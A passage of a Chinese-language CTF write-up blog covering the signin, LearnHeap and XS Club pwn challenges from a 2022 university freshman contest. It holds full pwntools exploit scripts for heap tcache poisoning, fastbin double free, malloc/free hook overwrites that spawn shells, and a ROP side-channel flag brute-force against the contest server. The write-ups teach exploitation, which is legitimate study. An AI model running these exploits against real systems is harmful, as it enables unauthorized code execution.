int(p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1], 16) codebase = getshell - m_elf.sym[\u0026#39;getshell\u0026#39;] for i in range(50): p.recvuntil(b\u0026#34;num1:\u0026#34;) num1 = p.recvuntil(b\u0026#34;,num2:\u0026#34;)[:-6] num2 = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] p.recvuntil(b\u0026#34;operator:\u0026#34;) oper = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] if b\u0026#34;/\u0026#34; in oper: oper = b\u0026#34;//\u0026#34; answer = eval(num1 + oper + num2) p.clean() p.sendline(str(answer)) p.recvuntil(b\u0026#34;Great Job!\\n\u0026#34;) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) overflow = ctypes.c_longlong(0x800000000000000c) # p.sendline(\u0026#34;-9223372036854775796\u0026#34;) p.sendline(str(overflow.value)) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) p.sendline(str(1)) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) p.sendline(b\u0026#34;%25$p.\u0026#34;) p.recvuntil(b\u0026#34;0x\u0026#34;) canary = int(p.recvuntil(b\u0026#34;.\u0026#34;)[:-1], 16) for i in range(2): p.recvuntil(b\u0026#34;...\u0026#34;) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) payload = b\u0026#34;a\u0026#34;*0x88 + pg(canary) + pg(0) + pg(getshell) p.sendline(payload) p.recvuntil(\u0026#34;Quickly, you are surrounded.\\n\\n\u0026#34;) p.clean() p.interactive() FLAG：flag{114514_V_me_F1fty}\nsignin 法一：free 大 chunk 绕过 tcache bin，然后 tcache poison 检查架构：\n查看 ida 伪代码：\n认真分析一下就会发现还是经典的堆菜单题\n先 free 掉一个很大的 chunk，这样这个 chunk 就会直接进入 unsorted bin（这个临界值我在自己的 64 位机器上测试，大概是 0x409），然后减去 main_arena+96，就可以得到 libc 的基址\n关于这个 main_arena+96 哪里来的，首先将 libc 拖入 ida，搜索 malloc_trim：\nmain_arena 的偏移就是 0x3ebc40\n然后我们使用 gdb 手动 free 一个大 chunk，查看内存\n这里 pwndbg 可以用 bins 命令，但我的 bins 和 heap 出现问题寄了，这里演示一下手动计算 unsorted bin 中只有一个 chunk 时存储的值和 main_arena 的偏移为何为 96\n0x00007ffff7dcdca0-0x7ffff79e2000-0x3ebc40=96\n使用计算器会快很多\n然后我们 free 掉一个小 chunk，让他进入 tcache bin，我们就能更改它的 next 位，从而可以实现任意地址写\n这样我们就可以更改__malloc_hook 的值为 one_gadget 了\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./signin\u0026#34; libc_name:str = \u0026#34;./libc-2.27.so\u0026#34; port: str = \u0026#34;10071\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ENV = {\u0026#34;LD_PRELOAD\u0026#34;:libc_name} context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x400904 \u0026#34;\u0026#34;\u0026#34;, env=ENV) else: p = process(fn, env=ENV) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) main_arena = 0x3EBC40 main_off = 96 chunks = 0x6020f0 # malloc的index不能直接控制 def allocate(size: int): p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(size)) # free的标签小于七 # 一共只能free两次 def free(index: int): p.clean() p.sendline(b\u0026#34;2\u0026#34;) p.clean() p.sendline(str(index)) def change(index: int, data: str): p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(data) def show(index: int): p.clean() p.sendline(b\u0026#34;4\u0026#34;) p.clean() p.sendline(str(index)) p.recvuntil(b\u0026#34;content: \u0026#34;) return p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] allocate(0x1000) # 1 allocate(0x80) allocate(0x80) free(0) libcbase = u64(show(0)[:9].ljust(0x8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + main_off) success(f\u0026#34;libcbase =\u0026gt; {hex(libcbase)}\u0026#34;) system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] malloc_hook_addr = libcbase + libc.sym[\u0026#39;__malloc_hook\u0026#39;] one_gadget = libcbase + 0x10a2fc next_chunk = 0x23 free(1) payload = pg(malloc_hook_addr - next_chunk) change(1, payload) allocate(0x80) allocate(0x7f) # gdb.attach(p) payload = b\u0026#34;0\u0026#34;*0x23 + pg(one_gadget) change(4, payload) allocate(0x10) p.clean() p.interactive() FLAG：flag{cd02sdyy9hfggsyo1wecd8ad2elttilnaj22}\n法二：通过stderr泄露libc，然后更改chunks指针 这个方法的要点在于，因为使用了setbuf函数，所以stdin、stdout、stderr会以全局变量的形式存在程序中。 我们可以通过tcache poisoning来将这个chunk分配到这个地方，然后因为程序中保存所有分配空间的指针chunks也是全局变量，所以这个chunk也可以更改chunks的值，这样子就可以将其指向__malloc_hook，这样子就能够将它的值改为one_gadget了\n这个方法有一个问题，就是分配在stderr处的chunk会将count置零，这是因为分配的位置刚好让count在它的bk位，而malloc会将bk置零： ^962996\n且看下面这个程序：\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main(void){ int *a = (int *)malloc(0x80); int *b = (int *)malloc(0x80); free(a); a[2] = 1; a = (int *)malloc(0x80); printf(\u0026#34;%d\\n\u0026#34;, a[2]); } 结果是0：\n若将a[2]改为a[1]，则结果为1：\n说明至少对tcache bin中的chunk来说，bk会被置零而fd不会\n虽然这可能会随着libc版本的改变而改变，但是如果我们做题的时候发现bk被置零了，至少我们多了一种可考虑的可能\nfrom pwn import * path = \u0026#34;/home/linux/0/pwn/signin\u0026#34; stderr = 0x6020A0 context(log_level = \u0026#34;debug\u0026#34;, arch = \u0026#34;amd64\u0026#34;, os = \u0026#34;linux\u0026#34;) #p = process(path) #p = gdb.debug(path, \u0026#34;b *(main+0xC1)\u0026#34;) p = remote(\u0026#34;43.248.98.206\u0026#34;, \u0026#34;10071\u0026#34;) def add(size): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;1\u0026#34;)\tp.sendlineafter(\u0026#34;size: \u0026#34;, str(size)) def edit(index, content): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;3\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) p.sendlineafter(\u0026#34;data: \u0026#34;, content) def display(index): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;4\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) def free(index): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;2\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) add(0x80) #0 add(0x80) #1 free(0) free(1) edit(1, p64(stderr)) #tcache poisoning add(0x80) #2 add(0x80) #0 0x6020A0 When mallocing chunk on 0x6020A0, the \u0026#34;idx\u0026#34; on .bss will change into 0. Actually I don\u0026#39;t know why. But the index of this chunk is 0. display(0) #leak libc p.recvuntil(\u0026#34;content: \u0026#34;) libc = int.from_bytes(p.recv(6), \u0026#34;little\u0026#34;) - 0x3EC680 print(\u0026#34;libc =\u0026#34;, hex(libc)) malloc_hook = libc + 0x3EBC30 print(\u0026#34;malloc_hook =\u0026#34;, hex(malloc_hook)) one_gadget = [libc + 0x4f302, libc + 0x10a2fc] edit(0, flat(0, 0, 0, 0, malloc_hook, 0x80)) #change the pointer save in chunks[0] into malloc_hook edit(0, flat(one_gadget[1])) #write one gadget add(0xA0) #trigger malloc_hook p.interactive() 法三：更改chance后将__free_hook改为system地址，在chunk内填入/bin/sh后free掉 libc-2.27.so释放符合大小的堆块会进入tcachebin中\n但是因为chance的限制，程序规定只能释放两次堆块，但利用tcachebin的特性可以改变释放次数\n改变后可以通过先释放大堆块进入unsortedbin，利用它的特性和UAF带出main_arena，然后通过固定偏移可以算出libc基地址\n再释放两次堆块进入tcache bin，改变链首部的堆块的fd指向__free_hook，再申请两个同样大小的堆块，再将__free_hook里的值改为system的，最后通过释放\u0026quot;/bin/sh\u0026quot;的堆块即可实现system('/bin/sh')，还有个地方得注意，只能打印8个堆块的内容，所以申请堆块的数量要把控好\nfrom pwn import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) #p=process(\u0026#39;signin\u0026#39;) libc=ELF(\u0026#39;libc-2.27.so\u0026#39;) p=remote(\u0026#39;43.248.98.206\u0026#39;,10071) elf=ELF(\u0026#39;signin\u0026#39;) def add(size): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;size: \u0026#39;,str(size)) def free(index): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) def xiugai(index,data): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;3\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) p.sendafter(\u0026#39;data: \u0026#39;,data) def pri(index): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;4\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) add(16) add(16) free(0) free(1) payload=p64(0x602070) xiugai(1,payload) add(16) add(16) xiugai(3,b\u0026#39;100\u0026#39;) # 增加chance次数 add(0x500) # 进入unsortedbin add(16) # 防止与top_chunk相连 free(4) pri(4) # 带出main_arena地址 p.recvuntil(\u0026#39;content: \u0026#39;) libc_addr=u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;))-0x3ebca0 success(\u0026#39;libc:\u0026#39;+hex(libc_addr)) #gdb.attach(p) free(0) free(2) xiugai(2,p64(libc.symbols[\u0026#39;__free_hook\u0026#39;]+libc_addr)) add(16) add(16) xiugai(7,p64(libc.symbols[\u0026#39;system\u0026#39;]+libc_addr)) xiugai(6,b\u0026#39;/bin/sh\\x00\u0026#39;) free(6) #gdb.attach(p) p.interactive() LearnHeap 查看程序架构 查看ida反编译代码 int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int ch_0; // [rsp+8h] [rbp-18h] BYREF int i; // [rsp+Ch] [rbp-14h] char *p; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); init(); p = (char *)malloc(0x20uLL); puts(\u0026#34;Welcome to LearnHeap!\u0026#34;); puts(\u0026#34;This is a guided learning test.\u0026#34;); puts(\u0026#34;In this test, gdb and pwndbg may help you.\u0026#34;); puts(byte_176B); puts(\u0026#34;Now you will see a very regular heap question. add() show() delete()\u0026#34;); puts(\u0026#34;Step 1. Leak Libc address.\\nStep 2. double free.\\nStep 3. hijacking __free_hook\\nStep 4. get shell!\u0026#34;); puts(\u0026#34;Now, let\u0026#39;s start!\u0026#34;); Step1(); Step2(); Step3(); Step4(); *free_hook = 0LL; memset(p - 592, 0, 0x240uLL); for ( i = 67; i; --i ) malloc(0x10uLL); memset(book, 0, sizeof(book)); puts(\u0026#34;Now Let\u0026#39;s attack.\u0026#34;); while ( 1 ) { puts(\u0026#34;Welcome~!\\n1.add\\n2.show\\n3.delete\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;ch_0); switch ( ch_0 ) { case 2: show(); break; case 3: delete(); break; case 1: add(); break; default: puts(\u0026#34;error.\u0026#34;); break; } } } step1 泄露libc基址 这里调用了add和delete函数： 因此我们编写的add和delete函数:\ndef add(index: int, size: int, content, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(size)) p.clean() p.sendline(content) def delete(index: int, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) 然后我们分配一个大chunk进入unsorted bin，这样它的fd指针会被设为main_arena+96，从而我们可以获得libc基址\n需要注意的是，虽然没有show函数，但是在add函数的最后会将输入的内容puts出来\n又因为malloc会首先从各个bin中寻找合适的chunk，所以我们第三次add的时候会分配到进入unsorted bin中的那个大chunk（或它的一部分），而malloc不会将内容清零（至少fd指针不清零，详情见此）\n所以，最后我们puts出来的，就是main_arena+96的指针\n注意，libc2.26没有tcache bin，所以注意想要进入fastbin的chunk大小（默认最大大小为(64 * SIZE_SZ / 4)，32 位为 64=0x40 字节，64 位为 128=0x80 字节）\nadd(0, 1071, b\u0026#34;\u0026#34;) # 大于1072会退出，但是1033就可以进入unsorted bin add(1, 0x10, b\u0026#34;\u0026#34;) delete(0) add(2, 0x10, b\u0026#34;\u0026#34;) p.recvuntil(b\u0026#34;Your book: \\n\u0026#34;) main_arena = 0x3dac20 main_off = 1002 libc_base = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + 1002) system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] p.sendlineafter(\u0026#34;Let\u0026#39;s make a test.\\n\u0026#34;, hex(system_addr)) step2 double free 构建循环malloc链 因为fastbin在libc2.26中对double free的检查只是单纯地检查表头的chunk是否和正在free的chunk一样，所以只要我们在double free中间随便free一个别的chunk，它就检查不到了（新版本不行）\n如果是2.27~2.28中的tcache bin就更好办了，因为其根本没有任何检查，直接free两次即可 而如果是2.29~2.31，tcache_entry增加了一个attribute，key字段，要么更改key字段然后double free，要么使用fastbin double free，详情见此文章\n大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了合并、分割以及中间检查的过程中。 因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY\n需要注意的是，能进入fastbin中的chunk会直接进入fastbin，尽管它和top chunk相邻也不会合并，见ctfwiki\ndelete(1) delete(2) delete(1) p.sendlineafter(\u0026#34;what sizes you make?\\n\u0026#34;, str(0x10)) step3 更改fd指针指向free_hook，填入危险函数地址 这时我们因为获得了一个循环的malloc链，可以无限地malloc，所以我们可以在第一次add时更改fd指针，指向free_hook，然后将其改为system的地址\n我们将\u0026quot;/bin/sh\u0026quot;存在一个chunk中，若__free_hook的值改为了system，则原本的free(\u0026quot;/bin/sh\u0026quot;)就会产生system(\u0026quot;/bin/sh\u0026quot;)的效果\nadd(3, 0x10, p64(m_elf.sym[\u0026#39;free_hook\u0026#39;])) add(4, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;) add(5, 0x10, b\u0026#34;a\u0026#34;) add(6, 0x10, p64(system_addr)) step4 getshell (fake) 这时候我们delete(4)就可以了\ndelete(4) 真实场景getshell！ 就是把上面的思路复现一遍\n不过不同的是我们不用leak libc了，因为上面我们已经获得了libc基址\n直接构建malloc链然后fastbin attack即可\n# flag设为True add(7, 0x10, b\u0026#34;\u0026#34;, True) add(8, 0x10, b\u0026#34;\u0026#34;, True) delete(7, True) delete(8, True) delete(7, True) add(9, 0x10, p64(libc.sym[\u0026#39;__free_hook\u0026#39;]+libc_base), True) add(10, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;, True) add(11, 0x10, b\u0026#34;a\u0026#34;, True) add(12, 0x10, p64(system_addr), True) delete(10, True) p.interactive() 完整exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./learnheap\u0026#34; libc_name:str = \u0026#34;./libc-2.26.so\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) m_elf = ELF(fn) libc = ELF(libc_name) def add(index: int, size: int, content, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(size)) p.clean() p.sendline(content) def delete(index: int, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) add(0, 1071, b\u0026#34;\u0026#34;) # 大于1072会退出，但是1033就可以进入unsorted bin add(1, 0x10, b\u0026#34;\u0026#34;) delete(0) add(2, 0x10, b\u0026#34;\u0026#34;) p.recvuntil(b\u0026#34;Your book: \\n\u0026#34;) main_arena = 0x3dac20 main_off = 1002 libc_base = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + 1002) system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] p.sendlineafter(\u0026#34;Let\u0026#39;s make a test.\\n\u0026#34;, hex(system_addr)) delete(1) delete(2) delete(1) p.sendlineafter(\u0026#34;what sizes you make?\\n\u0026#34;, str(0x10)) add(3, 0x10, p64(system_addr + 0x394AE8)) add(4, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;) add(5, 0x10, b\u0026#34;a\u0026#34;) add(6, 0x10, p64(system_addr)) delete(4) add(7, 0x10, b\u0026#34;\u0026#34;, True) add(8, 0x10, b\u0026#34;\u0026#34;, True) delete(7, True) delete(8, True) delete(7, True) add(9, 0x10, p64(libc.sym[\u0026#39;__free_hook\u0026#39;]+libc_base), True) add(10, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;, True) add(11, 0x10, b\u0026#34;a\u0026#34;, True) add(12, 0x10, p64(system_addr), True) delete(10, True) p.interactive() XS Club 检查程序架构 查看ida反编译代码 主要函数： 读取字符串并在末尾置零 一个加密函数，从最后的结果（\u0026quot;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026quot;）来看像是base64编码 base64解码 key = base64.b64decode(\u0026#34;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#34;) 大致思路 程序用沙箱屏蔽了execve的syscall，那么大致思路就是利用open、read的syscall读入flag\n而程序又把标准输入流和标准输出流关闭了，说明一次运行只能输入一次，而且不会有回显\n但是程序又有一个strcmp，这说明我们可以利用测信道的思路来解题\n在我们调用完strcmp后跳转到这里，如果和flag相符就ret到pause，否则就会jmp rax从而报错退出\n构建ROP chain 我们先用ropper看一下程序的gadget：\n发现并没有我们想要的可以改变rax和rdx的gadget\n如果想要改变rax，我们可以利用函数的返回值保存在rax这个特性：\nset_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) 但是像read这样的函数，往往是必须设置rdx的，所以我们还需要一个改变rdx的gadget\n经过观察，我们可以利用csu中的gadget：\n我们可以先用csu1中的gadget设置寄存器，然后再跳到csu2设置rdx，然后因为csu2中有一个call qword ptr [r12+rbx*8]，我们可以将r12的值设为read的got值，rbx为0，这样就能执行read函数\n当我们执行完read函数时，因为物理相邻的缘故，我们会比较rbp和rbx的值，\n所以我们要设置rbp不等于rbx\n然后我们就进入了csu1，这里有一串的pop，加上头部的add，一共我们要设置56个字节来跳过这些指令到ret\n然后我们设置一下rdi和rsi就转到call strcmp\n最后我们再填入一个pause的syscall就可以了，如果程序没有退出就会调用pause而停掉\n但问题来了，我们要怎么将我们想要与flag比较的字符输入进来呢？\n我们可以在读入invitation code的时候将需要比较的字符输入进来：\n所以rop chain为：\n# 计算代码基址 pie_base = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - (0x561d75601161 - 0x561d75600000) # strcmp、read strcmp_plt = pie_base + elf.plt[\u0026#39;strcmp\u0026#39;] read_plt = pie_base + elf.plt[\u0026#39;read\u0026#39;] read_got = pie_base + elf.got[\u0026#39;read\u0026#39;] # 设置rdi、rsi pop_rdi = pie_base + 0x00000000000011a3 pop_rsi_r15 = pie_base + 0x00000000000011a1 # syscall;ret syscall = pie_base + 0x00000000000009f5 # 有一个gadget可以设置rdx为0xa # set_rdx_10 = pie_base + 0x00000000000009f7 # 一大堆pop，设置寄存器 csu1 = pie_base + 0x000000000000119A # 将csu中设置的寄存器的值转移到其他寄存器 csu2 = pie_base + 0x0000000000001180 # bss节开始位置 bss_start = pie_base + 0x0000000000202020 # \u0026#34;./flag\\x00\u0026#34;字符串保存的位置 flag_str_addr = pie_base + 0x000000000020207a # 尝试的字符保存的位置 try_chr_addr = pie_base + 0x000000000020207f # 读入的flag文件内容保存的位置 target_chr_addr = bss_start + 0x300 # 测试strcmp成不成功的gadget test_gadget = pie_base + 0x00000000000099b # 设置rax为2 set_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) # 设置rax为0x22 set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) # 读入解码内容、\u0026#34;./flag\\x00\u0026#34;字符串、当前尝试的字符 io.sendafter(\u0026#39; code\\n\u0026#39;, flat([base64.b64decode( \u0026#39;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#39;), \u0026#39;\\x00flag\\x00\u0026#39;, try_c])) rop_chain = flat([ # 2号syscall，打开文件 set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, # 读取文件内容 csu1, 0, 1, read_got, 0, # edi target_chr_addr, # rsi flag_len + 1, # rdx csu2, \u0026#39;a\u0026#39; * 56, # 比对字符 pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, # 第flag_len个字符 0, strcmp_plt, test_gadget, # pause系统调用 set_rax_0x22, syscall ]) 设置延时器，保证程序正常执行 可以使用sleep函数、recv(0.5)还有signal模块来拖时间，等待程序进一步执行\nsignal模块\ndef handler(signum, frame): raise TimeoutError() signal.signal(signal.SIGALRM, handler) signal.alarm(1) try: io.recvuntil(\u0026#39;Okay, \u0026#39;) signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) except: signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) io.close() return False 这个模块设置在一秒之后发送TimeoutError异常，但如果在这一秒内recv到了'Okay，'，那就取消发送，否则关闭远程/停止进程\n这段代码保证了程序在一秒内正确执行（不正确执行的都死了）\nrecv(0.5)\ntry: io.recv(timeout=0.5) io.close() return True except: io.close() return False 如果在0x5秒内程序退出了，就说明没有执行pause系统调用，所以就关闭远程/停止进程\n为第9个字符单独写rop chain 因为我们的rop chain中有一条flag_len+1，而当我们爆破第九个字符时这个值为0xa，刚好和\\n的ASCII码一样，所以会发生截断，因此0xa不能出现在rop chain中\n而我们注意到syscall的gadget后面会自动将rdx设置为0xa： 那么我们直接常规思路调用read即可，不需要用到csu：\nif flag_len == 9: rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, pop_rdi, 0, pop_rsi_r15, target_chr_addr, 0, read_plt, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) 完整exp from pwn import * import base64 import signal context.arch = \u0026#39;amd64\u0026#39; elf = ELF(\u0026#39;club\u0026#39;) def handler(signum, frame): raise TimeoutError() def pwn(try_c, flag_len): # io = process(\u0026#39;./club\u0026#39;) # io = remote(\u0026#39;127.0.0.1\u0026#39;, 9999) io = remote(\u0026#39;43.248.98.206\u0026#39;, 10075) io.sendafter(\u0026#39; is XS-Club, your name?\\n\u0026#39;, \u0026#39;a\u0026#39;) signal.signal(signal.SIGALRM, handler) signal.alarm(1) try: io.recvuntil(\u0026#39;Okay, \u0026#39;) signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) except: signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) io.close() return False pie_base = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - \\ (0x561d75601161 - 0x561d75600000) strcmp_plt = pie_base + elf.plt[\u0026#39;strcmp\u0026#39;] read_plt = pie_base + elf.plt[\u0026#39;read\u0026#39;] read_got = pie_base + elf.got[\u0026#39;read\u0026#39;] pop_rdi = pie_base + 0x00000000000011a3 pop_rsi_r15 = pie_base + 0x00000000000011a1 syscall = pie_base + 0x00000000000009f5 csu1 = pie_base + 0x000000000000119A csu2 = pie_base + 0x0000000000001180 bss_start = pie_base + 0x0000000000202020 flag_str_addr = pie_base + 0x000000000020207a try_chr_addr = pie_base + 0x000000000020207f target_chr_addr = bss_start + 0x300 test_gadget = pie_base + 0x00000000000099b set_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) io.sendafter(\u0026#39; code\\n\u0026#39;, flat([base64.b64decode( \u0026#39;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#39;), \u0026#39;\\x00flag\\x00\u0026#39;, try_c])) rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, csu1, 0, 1, read_got, 0, # edi target_chr_addr, # rsi flag_len + 1, # rdx csu2, \u0026#39;a\u0026#39; * 56, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) if flag_len == 9: rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, pop_rdi, 0, pop_rsi_r15, target_chr_addr, 0, read_plt, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) io.sendlineafter(\u0026#39; leave your phone number here\\n\u0026#39;, flat({0x28: rop_chain})) sleep(0.1) io.recvuntil(\u0026#39;~\\nNow you can join the club, go crazy!!! *\\\\(^o^)/*\\n\u0026#39;) try: io.recv(timeout=0.5) io.close() return True except: io.close() return False table = string.printable + \u0026#34;\\n\u0026#34; flag = \u0026#39;\u0026#39; t = time.time() while True: for c in table: if pwn(c, len(flag)): flag += c break if flag.endswith(\u0026#39;}\u0026#39;): success(flag) success(flat([\u0026#39;time: \u0026#39;, str(round(time.time() - t, 2)), \u0026#39;s\u0026#39;])) break else: info(flag) with open(\u0026#34;out\u0026#34;, \u0026#34;a\u0026#34;, encoding=\u0026#39;UTF-8\u0026#39;) as f: f.write(flag + \u0026#34;\\n\u0026#34;) info(flat([\u0026#39;time: \u0026#39;, str(round(time.time() - t, 2)), \u0026#39;s\u0026#39;])) sleep(0.1) ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E6%9A%A8%E5%8D%97%E5%A4%A7%E5%AD%A62022%E6%96%B0%E7%94%9F%E8%B5%9B%E5%88%9D%E8%B5%9B-%E9%9D%9E%E5%AE%98%E6%96%B9writeup/","section":"writeup","summary":"It is not so much our friends\u0026rsquo; help that helps us, as the confidence of their help. — Epicurus 原题链接 EasyEasyEasy 因为读入的是一个有符号数，所以当输入-1 的时候也是合法的 而我们知道，-1%256 也是-1，而v5[-1","tags":["pwn"],"title":"暨南大学2022新生赛初赛 非官方WriteUp"},{"categories":["tricks"],"contents":" The extreme limit of wisdom, that\u0026rsquo;s what the public calls madness. — Jean Cocteau\n查看程序架构 ida伪代码 exp 这题手工构造ropchain比较困难，但是我们可以利用ropper或者ROPgadget的ropchain功能来生成：\nropper ROPgadget exp 需要注意的是，工具生成的代码和我们日常使用的代码格式和风格上都有一定差距，从struct包中导入的pack函数也会和pwntools中的pack起冲突，如果一定要使用struct的pack，就在导入pwntools后再导入struct，这样就可以覆盖掉pack\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes from struct import pack pss: bool = True fn: str = \u0026#34;./rop\u0026#34; libc_name: str = \u0026#34;\u0026#34; port: str = \u0026#34;27311\u0026#34; if_32: bool = True if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def 